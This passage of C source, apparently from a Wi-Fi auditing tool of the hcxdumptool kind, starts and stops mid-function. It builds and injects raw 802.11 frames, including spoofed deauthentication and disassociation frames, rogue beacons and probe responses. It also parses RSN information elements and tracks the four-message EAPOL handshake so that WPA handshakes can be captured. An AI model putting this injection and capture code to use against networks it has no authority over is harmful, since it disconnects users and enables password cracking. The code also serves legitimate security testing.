HCXDEBUG\nfprintf(fh_debug, \"send_80211_associationresponse failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_authenticationresponse(void)\n{\nmacftx = (ieee80211_mac_t*)&wltxbuffer[RTHTX_SIZE];\nmacftx->type = IEEE80211_FTYPE_MGMT;\nmacftx->subtype = IEEE80211_STYPE_AUTH;\nwltxbuffer[RTHTX_SIZE + 1] = 0;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macfrx->addr2, ETH_ALEN);\nmemcpy(macftx->addr2, macfrx->addr1, ETH_ALEN);\nmemcpy(macftx->addr3, macfrx->addr3, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter3++ << 4);\nif(seqcounter1 > 4095) seqcounter3 = 1;\nmemcpy(&wltxbuffer[RTHTX_SIZE + MAC_SIZE_NORM], &authenticationresponsedata, AUTHENTICATIONRESPONSE_SIZE);\nif((write(fd_socket_tx, &wltxbuffer, RTHTX_SIZE + MAC_SIZE_NORM + AUTHENTICATIONRESPONSE_SIZE)) == RTHTX_SIZE + MAC_SIZE_NORM + AUTHENTICATIONRESPONSE_SIZE)\n\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"send_80211_authenticationresponse failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_reassociationrequest(size_t i)\n{\nstatic ssize_t ii;\nstatic ieee80211_reassoc_req_t *reassociationrequest;\n\nii = RTHTX_SIZE;\nmacftx = (ieee80211_mac_t*)&wltxbuffer[ii];\nmacftx->type = IEEE80211_FTYPE_MGMT;\nmacftx->subtype = IEEE80211_STYPE_REASSOC_REQ;\nwltxbuffer[ii + 1] = 0;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, (aplist +i)->macap, ETH_ALEN);\nmemcpy(macftx->addr2, (aplist +i)->macclient, ETH_ALEN);\nmemcpy(macftx->addr3, (aplist +i)->macap, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter3++ << 4);\nif(seqcounter1 > 4095) seqcounter3 = 1;\nii += MAC_SIZE_NORM;\nreassociationrequest = (ieee80211_reassoc_req_t*)&wltxbuffer[ii];\nreassociationrequest->capability = HCXTXCAPABILITY;\nreassociationrequest->listen_interval = HCXTXLISTENINTERVAL;\nmemcpy(reassociationrequest->current_macap, (aplist +i)->macap, ETH_ALEN);\nii += sizeof(ieee80211_reassoc_req_t) -1;\nwltxbuffer[ii ++] = 0;\nwltxbuffer[ii ++] = (aplist +i)->ie.essidlen;\nmemcpy(&wltxbuffer[ii], (aplist +i)->ie.essid, (aplist +i)->ie.essidlen);\nii += (aplist +i)->ie.essidlen;\nmemcpy(&wltxbuffer[ii], &reassociationrequestdata, REASSOCIATIONREQUEST_SIZE);\nif(((aplist +i)->ie.flags & APGS_CCMP) == APGS_CCMP) wltxbuffer[ii +0x17] = RSN_CS_CCMP;\nelse if(((aplist +i)->ie.flags & APGS_TKIP) == APGS_TKIP) wltxbuffer[ii +0x17] = RSN_CS_TKIP;\nif(((aplist +i)->ie.flags & APCS_CCMP) == APCS_CCMP) wltxbuffer[ii +0x1d] = RSN_CS_CCMP;\nelse if(((aplist +i)->ie.flags & APCS_TKIP) == APCS_TKIP) wltxbuffer[ii +0x1d] = RSN_CS_TKIP;\nii += REASSOCIATIONREQUEST_SIZE;\nif((write(fd_socket_tx, &wltxbuffer, ii)) == ii)\n\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"send_80211_reassociationreques failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_authenticationrequest(void)\n{\nmacftx = (ieee80211_mac_t*)&wltxbuffer[RTHTX_SIZE];\nmacftx->type = IEEE80211_FTYPE_MGMT;\nmacftx->subtype = IEEE80211_STYPE_AUTH;\nwltxbuffer[RTHTX_SIZE + 1] = 0;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macfrx->addr2, ETH_ALEN);\nmemcpy(macftx->addr2, macclientrg, ETH_ALEN);\nmemcpy(macftx->addr3, macfrx->addr3, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter2++ << 4);\nif(seqcounter1 > 4095) seqcounter2 = 1;\nmemcpy(&wltxbuffer[RTHTX_SIZE + MAC_SIZE_NORM], &authenticationrequestdata, AUTHENTICATIONREQUEST_SIZE);\nif((write(fd_socket_tx, &wltxbuffer, RTHTX_SIZE + MAC_SIZE_NORM + AUTHENTICATIONREQUEST_SIZE)) == RTHTX_SIZE + MAC_SIZE_NORM + AUTHENTICATIONREQUEST_SIZE)\n\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"send_80211_authenticationrequest failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_probereresponse(u8 *macclientrsp, u8 *macaprgrsp, u8 essidlenrsp, u8 *essidrsp)\n{\nstatic ssize_t ii;\nstatic ieee80211_beacon_proberesponse_t *beacontx;\n\nii = RTHTX_SIZE;\nmacftx = (ieee80211_mac_t*)&wltxbuffer[ii];\nmacftx->type = IEEE80211_FTYPE_MGMT;\nmacftx->subtype = IEEE80211_STYPE_PROBE_RESP;\nwltxbuffer[ii + 1] = 0;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macclientrsp, ETH_ALEN);\nmemcpy(macftx->addr2, macaprgrsp, ETH_ALEN);\nmemcpy(macftx->addr3, macaprgrsp, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter3++ << 4);\nif(seqcounter1 > 4095) seqcounter3 = 1;\nii += MAC_SIZE_NORM;\nbeacontx = (ieee80211_beacon_proberesponse_t*)&wltxbuffer[ii];\nbeacontx->timestamp = __hcx64le(beacontimestamp++);\nbeacontx->beacon_interval = HCXTXBEACONINTERVAL;\nbeacontx->capability = HCXTXCAPABILITY;\nii += IEEE80211_PROBERESPONSE_SIZE;\nwltxbuffer[ii ++] = 0;\nwltxbuffer[ii ++] = essidlenrsp;\nmemcpy(&wltxbuffer[ii], essidrsp, essidlenrsp);\nii += essidlenrsp;\nmemcpy(&wltxbuffer[ii], &proberesponsedata, PROBERESPONSEDATA_SIZE);\nwltxbuffer[ii + 0x0c] = (u8)(scanlist + scanlistindex)->channel;\nii += PROBERESPONSEDATA_SIZE;\nif((write(fd_socket_tx, &wltxbuffer, ii)) == ii)\n\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"send_80211_probereresponse failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_beacon(void)\n{\nstatic ssize_t ii;\nstatic ieee80211_beacon_proberesponse_t *beacontx;\n\nii = RTHTX_SIZE;\nmacftx = (ieee80211_mac_t*)&wltxbuffer[ii];\nmacftx->type = IEEE80211_FTYPE_MGMT;\nmacftx->subtype = IEEE80211_STYPE_BEACON;\nwltxbuffer[ii + 1] = 0;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macbc, ETH_ALEN);\nmemcpy(macftx->addr2, &macaprghidden, ETH_ALEN);\nmemcpy(macftx->addr3, &macaprghidden, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter4++ << 4);\nif(seqcounter1 > 4095) seqcounter4 = 1;\nii += MAC_SIZE_NORM;\nbeacontx = (ieee80211_beacon_proberesponse_t*)&wltxbuffer[ii];\nbeacontx->timestamp = __hcx64le(beacontimestamp++);\nbeacontx->beacon_interval = HCXTXBEACONINTERVAL;\nbeacontx->capability = HCXTXCAPABILITY;\nii += IEEE80211_BEACON_SIZE;\nmemcpy(&wltxbuffer[ii], &beacondata, BEACONDATA_SIZE);\nwltxbuffer[ii + 0x0e] = (u8)(scanlist + scanlistindex)->channel;\nii += BEACONDATA_SIZE;\nif((write(fd_socket_tx, &wltxbuffer, ii)) == ii)\n\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"send_80211_beacon failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_proberequest_undirected(void)\n{\nmacftx = (ieee80211_mac_t*)&wltxbuffer[RTHTX_SIZE];\nmacftx->type = IEEE80211_FTYPE_MGMT;\nmacftx->subtype = IEEE80211_STYPE_PROBE_REQ;\nwltxbuffer[RTHTX_SIZE + 1] = 0;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macbc, ETH_ALEN);\nmemcpy(macftx->addr2, macclientrg, ETH_ALEN);\nmemcpy(macftx->addr3, macbc, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter2++ << 4);\nif(seqcounter1 > 4095) seqcounter2 = 1;\nmemcpy(&wltxbuffer[RTHTX_SIZE + MAC_SIZE_NORM], &proberequest_undirected_data, PROBEREQUEST_UNDIRECTED_SIZE);\nif((write(fd_socket_tx, &wltxbuffer, RTHTX_SIZE + MAC_SIZE_NORM + PROBEREQUEST_UNDIRECTED_SIZE)) == RTHTX_SIZE + MAC_SIZE_NORM + PROBEREQUEST_UNDIRECTED_SIZE)\n\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"send_80211_proberequest_undirected failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_disassociation_fm_ap(const u8* macclient, const u8* macap, u8 reason)\n{\nmacftx = (ieee80211_mac_t*)&wltxbuffer[RTHTX_SIZE];\nmacftx->type = IEEE80211_FTYPE_MGMT;\nmacftx->subtype = IEEE80211_STYPE_DISASSOC;\nwltxbuffer[RTHTX_SIZE +1] = 0;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macclient, ETH_ALEN);\nmemcpy(macftx->addr2, macap, ETH_ALEN);\nmemcpy(macftx->addr3, macap, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter1++ << 4);\nif(seqcounter1 > 4095) seqcounter1 = 1;\nwltxbuffer[RTHTX_SIZE + MAC_SIZE_NORM] = reason;\nwltxbuffer[RTHTX_SIZE + MAC_SIZE_NORM +1] = 0;\nif((write(fd_socket_tx, &wltxbuffer, RTHTX_SIZE + MAC_SIZE_NORM +2)) == RTHTX_SIZE + MAC_SIZE_NORM +2)\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"send_80211_disassociation_fm_ap failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_disassociation_fm_client(const u8* macclient, const u8* macap, u8 reason)\n{\nmacftx = (ieee80211_mac_t*)&wltxbuffer[RTHTX_SIZE];\nmacftx->type = IEEE80211_FTYPE_MGMT;\nmacftx->subtype = IEEE80211_STYPE_DISASSOC;\nwltxbuffer[RTHTX_SIZE +1] = 0;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macap, ETH_ALEN);\nmemcpy(macftx->addr2, macclient, ETH_ALEN);\nmemcpy(macftx->addr3, macap, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter1++ << 4);\nif(seqcounter1 > 4095) seqcounter1 = 1;\nwltxbuffer[RTHTX_SIZE + MAC_SIZE_NORM] = reason;\nwltxbuffer[RTHTX_SIZE + MAC_SIZE_NORM +1] = 0;\nif((write(fd_socket_tx, &wltxbuffer, RTHTX_SIZE + MAC_SIZE_NORM +2)) == RTHTX_SIZE + MAC_SIZE_NORM +2)\n\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"send_80211_disassociation_fm_client failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_deauthentication_fm_ap(const u8* macclient, const u8* macap, u8 reason)\n{\nmacftx = (ieee80211_mac_t*)&wltxbuffer[RTHTX_SIZE];\nmacftx->type = IEEE80211_FTYPE_MGMT;\nmacftx->subtype = IEEE80211_STYPE_DEAUTH;\nwltxbuffer[RTHTX_SIZE +1] = 0;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macclient, ETH_ALEN);\nmemcpy(macftx->addr2, macap, ETH_ALEN);\nmemcpy(macftx->addr3, macap, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter1++ << 4);\nif(seqcounter1 > 4095) seqcounter1 = 1;\nwltxbuffer[RTHTX_SIZE + MAC_SIZE_NORM] = reason;\nwltxbuffer[RTHTX_SIZE + MAC_SIZE_NORM +1] = 0;\nif((write(fd_socket_tx, &wltxbuffer, RTHTX_SIZE + MAC_SIZE_NORM +2)) == RTHTX_SIZE + MAC_SIZE_NORM +2)\n\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"send_80211_deauthentication_fm_ap failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_deauthentication_fm_client(const u8* macclient, const u8* macap, u8 reason)\n{\nmacftx = (ieee80211_mac_t*)&wltxbuffer[RTHTX_SIZE];\nmacftx->type = IEEE80211_FTYPE_MGMT;\nmacftx->subtype = IEEE80211_STYPE_DEAUTH;\nwltxbuffer[RTHTX_SIZE +1] = 0;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macap, ETH_ALEN);\nmemcpy(macftx->addr2, macclient, ETH_ALEN);\nmemcpy(macftx->addr3, macap, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter1++ << 4);\nif(seqcounter1 > 4095) seqcounter1 = 1;\nwltxbuffer[RTHTX_SIZE + MAC_SIZE_NORM] = reason;\nwltxbuffer[RTHTX_SIZE + MAC_SIZE_NORM +1] = 0;\nif((write(fd_socket_tx, &wltxbuffer, RTHTX_SIZE + MAC_SIZE_NORM +2)) == RTHTX_SIZE + MAC_SIZE_NORM +2)\n\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"send_80211_deauthentication_fm_client failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*===========================================================================*/\n/*===========================================================================*/\n/* RX 802.11 */\nstatic inline __attribute__((always_inline)) void get_tagvendor(infoelement_t *infoelement, int infolen, u8 *infostart)\n{\nstatic size_t c;\nstatic ieee80211_wpaie_t *iewpa;\nstatic ieee80211_wpasuite_t *wpasuite;\nstatic ieee80211_wpasuitecount_t *wpasuitecount;\n\niewpa = (ieee80211_wpaie_t*)infostart;\nif(memcmp(&wpasuiteoui, iewpa->oui, 3) != 0) return;\nif(iewpa->type != 1) return;\nif(__hcx16le(iewpa->version) != 1) return;\ninfostart += IEEE80211_WPAIE_SIZE;\ninfolen -= IEEE80211_WPAIE_SIZE;\nwpasuite =(ieee80211_wpasuite_t*)infostart;\nif(memcmp(&wpasuiteoui, wpasuite->oui, 3) != 0) return;\ninfostart += IEEE80211_WPASUITE_SIZE;\ninfolen -= IEEE80211_WPASUITE_SIZE;\nwpasuitecount =(ieee80211_wpasuitecount_t*)infostart;\ninfostart += IEEE80211_WPASUITECOUNT_SIZE;\ninfolen -= IEEE80211_WPASUITECOUNT_SIZE;\nfor(c = 0; c < __hcx16le(wpasuitecount->count); c++)\n\t{\n\tif(infolen <= 0) return;\n\twpasuite =(ieee80211_wpasuite_t*)infostart;\n\tinfostart += IEEE80211_WPASUITE_SIZE;\n\tinfolen -= IEEE80211_WPASUITE_SIZE;\n\t}\nwpasuitecount =(ieee80211_wpasuitecount_t*)infostart;\ninfostart += IEEE80211_WPASUITECOUNT_SIZE;\ninfolen -= IEEE80211_WPASUITECOUNT_SIZE;\nfor(c = 0; c < __hcx16le(wpasuitecount->count); c++)\n\t{\n\tif(infolen <= 0) return;\n\twpasuite =(ieee80211_wpasuite_t*)infostart;\n\tif(memcmp(&wpasuiteoui, wpasuite->oui, 3) == 0)\n\t\t{\n\t\tif(wpasuite->type == WPA_AKM_PSK) infoelement->flags |= APWPAAKM_PSK;\n\t\t}\n\tinfostart += IEEE80211_WPASUITE_SIZE;\n\tinfolen -= IEEE80211_WPASUITE_SIZE;\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void get_tagrsn(infoelement_t *infoelement, int infolen, u8 *infostart)\n{\nstatic size_t c;\nstatic ieee80211_rsnie_t *iersn;\nstatic ieee80211_rnsuite_t *rsnsuite;\nstatic ieee80211_rsnsuitecount_t *rsnsuitecount;\nstatic ieee80211_rsncapability_t *rsncapability;\n\niersn = (ieee80211_rsnie_t*)infostart;\nif(__hcx16le(iersn->version) != 1) return;\ninfostart += IEEE80211_RSNIE_SIZE;\ninfolen -= IEEE80211_RSNIE_SIZE;\nrsnsuite =(ieee80211_rnsuite_t*)infostart;\nif(memcmp(&rsnsuiteoui, rsnsuite->oui, 3) != 0) return;\nif(rsnsuite->type == RSN_CS_CCMP) infoelement->flags |= APGS_CCMP;\nif(rsnsuite->type == RSN_CS_TKIP) infoelement->flags |= APGS_TKIP;\ninfostart += IEEE80211_RSNSUITE_SIZE;\ninfolen -= IEEE80211_RSNSUITE_SIZE;\nrsnsuitecount =(ieee80211_rsnsuitecount_t*)infostart;\ninfostart += IEEE80211_RSNSUITECOUNT_SIZE;\ninfolen -= IEEE80211_RSNSUITECOUNT_SIZE;\nfor(c = 0; c < __hcx16le(rsnsuitecount->count); c++)\n\t{\n\tif(infolen <= 0) return;\n\trsnsuite =(ieee80211_rnsuite_t*)infostart;\n\tif(memcmp(&rsnsuiteoui, rsnsuite->oui, 3) == 0)\n\t\t{\n\t\tif(rsnsuite->type == RSN_CS_CCMP) infoelement->flags |= APCS_CCMP;\n\t\tif(rsnsuite->type == RSN_CS_TKIP) infoelement->flags |= APCS_TKIP;\n\t\t}\n\tinfostart += IEEE80211_RSNSUITE_SIZE;\n\tinfolen -= IEEE80211_RSNSUITE_SIZE;\n\t}\nrsnsuitecount =(ieee80211_rsnsuitecount_t*)infostart;\ninfostart += IEEE80211_RSNSUITECOUNT_SIZE;\ninfolen -= IEEE80211_RSNSUITECOUNT_SIZE;\nfor(c = 0; c < __hcx16le(rsnsuitecount->count); c++)\n\t{\n\tif(infolen <= 0) return;\n\trsnsuite =(ieee80211_rnsuite_t*)infostart;\n\tif(memcmp(&rsnsuiteoui, rsnsuite->oui, 3) == 0)\n\t\t{\n\t\tif(rsnsuite->type == RSN_AKM_PSK) infoelement->flags |= APRSNAKM_PSK;\n\t\tif(rsnsuite->type == RSN_AKM_PSK256) infoelement->flags |= APRSNAKM_PSK256;\n\t\tif(rsnsuite->type == RSN_AKM_PSKFT) infoelement->flags |= APRSNAKM_PSKFT;\n\t\t}\n\tinfostart += IEEE80211_RSNSUITE_SIZE;\n\tinfolen -= IEEE80211_RSNSUITE_SIZE;\n\t}\nif(infolen < 2) return;\nrsncapability = (ieee80211_rsncapability_t*)infostart;\nif((__hcx16le(rsncapability->capability) & MFP_REQUIRED) == MFP_REQUIRED) infoelement->flags |= AP_MFP;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void tagwalk_channel_essid_rsn(infoelement_t *infoelement, int infolen, u8 *infostart)\n{\nstatic ieee80211_ietag_t *infoptr;\n\nwhile(0 < infolen)\n\t{\n\tinfoptr = (ieee80211_ietag_t*)infostart;\n\tif(infolen < (int)(infoptr->len + IEEE80211_IETAG_SIZE)) return;\n\tif(infoptr->id == TAG_SSID)\n\t\t{\n\t\tif((infoptr->len > 0) && (infoptr->len <= ESSID_MAX))\n\t\t\t{\n\t\t\tinfoelement->flags |= APIE_ESSID;\n\t\t\tinfoelement->essidlen = infoptr->len;\n\t\t\tmemcpy(infoelement->essid, &infoptr->ie[0], infoptr->len);\n\t\t\t}\n\t\t}\n\telse if(infoptr->id == TAG_CHAN)\n\t\t{\n\t\tif(infoptr->len == 1) infoelement->channel = infoptr->ie[0];\n\t\t}\n\telse if(infoptr->id == TAG_RSN)\n\t\t{\n\t\tif(infoptr->len >= IEEE80211_RSNIE_LEN_MIN) get_tagrsn(infoelement, infoptr->len, infoptr->ie);\n\t\t}\n\telse if(infoptr->id == TAG_VENDOR)\n\t\t{\n\t\tif(infoptr->len >= IEEE80211_WPAIE_LEN_MIN) get_tagvendor(infoelement, infoptr->len, infoptr->ie);\n\t\t}\n\tinfostart += infoptr->len + IEEE80211_IETAG_SIZE;\n\tinfolen -= infoptr->len + IEEE80211_IETAG_SIZE;\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) int get_keyinfo(u16 kyif)\n{\nif(kyif & WPA_KEY_INFO_ACK)\n\t{\n\tif(kyif & WPA_KEY_INFO_INSTALL) return 3; /* handshake 3 */\n\telse return 1; /* handshake 1 */\n\t}\nelse\n\t{\n\tif(kyif & WPA_KEY_INFO_SECURE) return 4; /* handshake 4 */\n\telse return 2; /* handshake 2 */\n\t}\nreturn 0;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211pspoll(void)\n{\nstatic size_t i;\n\nfor(i = 0; i < APLIST_MAX - 1; i++)\n\t{\n\tif(memcmp(macfrx->addr1, (aplist +i)->macap, ETH_ALEN) == 0)\n\t\t{\n\t\tif((aplist +i)->status >= AP_EAPOL_M3) return;\n\t\tif(memcmp(&macbc, (aplist +i)->macclient, ETH_ALEN) == 0) (aplist +i)->count = attemptapmax;\n\t\tmemcpy((aplist +i)->macclient, macfrx->addr2, ETH_ALEN);\n\t\treturn;\n\t\t}\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211action(void)\n{\nstatic size_t i;\nstatic ieee80211_action_t *action;\n\nfor(i = 0; i < APLIST_MAX - 1; i++)\n\t{\n\tif(memcmp((aplist +i)->macap, macfrx->addr1, ETH_ALEN) == 0)\n\t\t{\n\t\tif((aplist +i)->status >= AP_EAPOL_M3) return;\n\t\tif(memcmp(&macbc, (aplist +i)->macclient, ETH_ALEN) == 0) (aplist +i)->count = attemptapmax;\n\t\tmemcpy((aplist +i)->macclient, macfrx->addr2, ETH_ALEN);\n\t\tbreak;\n\t\t}\n\t}\naction = (ieee80211_action_t*)payloadptr;\nif(payloadlen < (IEEE80211_ACTION_SIZE + IEEE80211_IETAG_SIZE)) return;\nif((action->category == RADIO_MEASUREMENT) && (action->code == NEIGHBOR_REPORT_REQUEST)) writeepb();\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211qosdata(void)\n{\nstatic size_t i;\n\nif((macfrx->to_ds != 1) && (macfrx->from_ds != 0)) return;\nfor(i = 0; i < APLIST_MAX - 1; i++)\n\t{\n\t\t{\n\t\tif(memcmp((aplist +i)->macap, macfrx->addr1, ETH_ALEN) == 0)\n\t\t\t{\n\t\t\tif((aplist +i)->status >= AP_EAPOL_M3) return;\n\t\t\tif(memcmp(&macbc, (aplist +i)->macclient, ETH_ALEN) == 0) (aplist +i)->count = attemptapmax;\n\t\t\tmemcpy((aplist +i)->macclient, macfrx->addr2, ETH_ALEN);\n\t\t\treturn;\n\t\t\t}\n\t\t}\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211qosnull(void)\n{\nstatic size_t i;\n\nif((macfrx->to_ds != 1) && (macfrx->from_ds != 0)) return;\nfor(i = 0; i < APLIST_MAX - 1; i++)\n\t{\n\t\t{\n\t\tif(memcmp((aplist +i)->macap, macfrx->addr1, ETH_ALEN) == 0)\n\t\t\t{\n\t\t\tif((aplist +i)->status >= AP_EAPOL_M3) return;\n\t\t\tif(memcmp(&macbc, (aplist +i)->macclient, ETH_ALEN) == 0) (aplist +i)->count = attemptapmax;\n\t\t\tmemcpy((aplist +i)->macclient, macfrx->addr2, ETH_ALEN);\n\t\t\treturn;\n\t\t\t}\n\t\t}\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211null(void)\n{\nstatic size_t i;\n\nif((macfrx->to_ds != 1) && (macfrx->from_ds != 0)) return;\nfor(i = 0; i < APLIST_MAX - 1; i++)\n\t{\n\t\t{\n\t\tif(memcmp((aplist +i)->macap, macfrx->addr1, ETH_ALEN) == 0)\n\t\t\t{\n\t\t\tif((aplist +i)->status >= AP_EAPOL_M3) return;\n\t\t\tif(memcmp(&macbc, (aplist +i)->macclient, ETH_ALEN) == 0) (aplist +i)->count = attemptapmax;\n\t\t\tmemcpy((aplist +i)->macclient, macfrx->addr2, ETH_ALEN);\n\t\t\treturn;\n\t\t\t}\n\t\t}\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211blockack(void)\n{\nstatic size_t i;\n\nfor(i = 0; i < APLIST_MAX - 1; i++)\n\t{\n\tif(memcmp((aplist +i)->macap, macfrx->addr1, ETH_ALEN) == 0)\n\t\t{\n\t\tif((aplist +i)->status >= AP_EAPOL_M3) return;\n\t\tif(memcmp(&macbc, (aplist +i)->macclient, ETH_ALEN) == 0) (aplist +i)->count = attemptapmax;\n\t\tmemcpy((aplist +i)->macclient, macfrx->addr2, ETH_ALEN);\n\t\treturn;\n\t\t}\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211blockackreq(void)\n{\nstatic size_t i;\n\nfor(i = 0; i < APLIST_MAX - 1; i++)\n\t{\n\tif(memcmp((aplist +i)->macap, macfrx->addr1, ETH_ALEN) == 0)\n\t\t{\n\t\tif((aplist +i)->status >= AP_EAPOL_M3) return;\n\t\tif(memcmp(&macbc, (aplist +i)->macclient, ETH_ALEN) == 0) (aplist +i)->count = attemptapmax;\n\t\tmemcpy((aplist +i)->macclient, macfrx->addr2, ETH_ALEN);\n\t\treturn;\n\t\t}\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211eap_start(void)\n{\nstatic size_t i;\n\nfor(i = 0; i < CLIENTLIST_MAX - 1; i++)\n\t{\n\tif(memcmp(macfrx->addr2, (clientlist +i)->macclient, ETH_ALEN) != 0) continue;\n\tif(memcmp(macfrx->addr1, (clientlist +i)->macap, ETH_ALEN) != 0) continue;\n\t(clientlist +i)->tsakt = tsakt;\n\t(clientlist +i)->status |= CLIENT_EAP_START;\n\tif((clientlist +i)->count == 0) return;\n\tsend_80211_eap_request_id();\n\t(clientlist +i)->count -= 1;\n\treturn;\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211eapol_m4(void)\n{\nstatic size_t i;\n\nauthseqakt.replaycountm4 = __hcx64be(wpakey->replaycount);\nif(memcmp(&zeroed, &wpakey->nonce, 32) != 0)\nif((authseqakt.status & AP_EAPOL_M3) == AP_EAPOL_M3)\n\t{\n\tif(memcmp(&authseqakt.macap, macfrx->addr1, ETH_ALEN) == 0)\n\t\t{\n\t\tif((authseqakt.replaycountm1 == (authseqakt.replaycountm4 -1)) && (authseqakt.replaycountm2 == (authseqakt.replaycountm4 -1)) && (authseqakt.replaycountm3 == authseqakt.replaycountm4))\n\t\t\t{\n\t\t\tauthseqakt.kdv4 = kdv;\n\t\t\tif(authseqakt.kdv3 == kdv)\n\t\t\t\t{\n\t\t\t\tif((tsakt - tshold) < EAPOLM4TIMEOUT)\n\t\t\t\t\t{\n\t\t\t\t\tif(memcmp(&zeroed, &wpakey->nonce, 32) != 0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\tfor(i = 0; i < APLIST_MAX -1; i++)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif(memcmp((aplist +i)->macap, authseqakt.macap, ETH_ALEN) == 0)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t(aplist +i)->tsakt = tsakt;\n\t\t\t\t\t\t\t\tauthseqakt.status = 0;\n\t\t\t\t\t\t\t\t(aplist +i)->status |= AP_EAPOL_M4;\n\t\t\t\t\t\t\t\twanteventflag |= exiteapolm4flag;\n\t\t\t\t\t\t\t\treturn;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\nauthseqakt.status = 0;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211eapol_m3(void)\n{\nstatic size_t i;\n\nauthseqakt.replaycountm3 = __hcx64be(wpakey->replaycount);\nif((authseqakt.status & AP_EAPOL_M2) == AP_EAPOL_M2)\n\t{\n\tif(memcmp(&authseqakt.macap, macfrx->addr2, ETH_ALEN) == 0)\n\t\t{\n\t\tif(authseqakt.replaycountm2 == (authseqakt.replaycountm3 - 